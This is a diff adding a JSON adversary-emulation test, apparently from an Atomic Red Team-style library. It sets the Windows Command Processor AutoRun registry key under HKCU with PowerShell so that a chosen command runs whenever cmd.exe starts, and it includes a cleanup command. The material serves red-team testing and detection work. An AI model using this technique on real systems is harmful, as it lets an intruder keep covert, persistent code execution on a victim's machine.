@@ -1,0 +1,31 @@
+{
+    "name": "HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)",
+    "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed. [reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"\nif (!(Test-Path -path $path)){\n  New-Item -ItemType Key -Path $path\n}\nNew-ItemProperty -Path $path -Name \"AutoRun\" -Value \"#{command}\" -PropertyType \"String\"",
+        "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -ErrorAction Ignore",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1546",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+    ],
+    "technique": "Event Triggered Execution",
+    "source": "ART",
+    "uuid": "36b8dbf9-59b1-4e9b-a3bb-36e80563ef01",
+    "arguments": {
+        "command": {
+            "description": "Command to Execute",
+            "type": "string",
+            "default": "notepad.exe"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
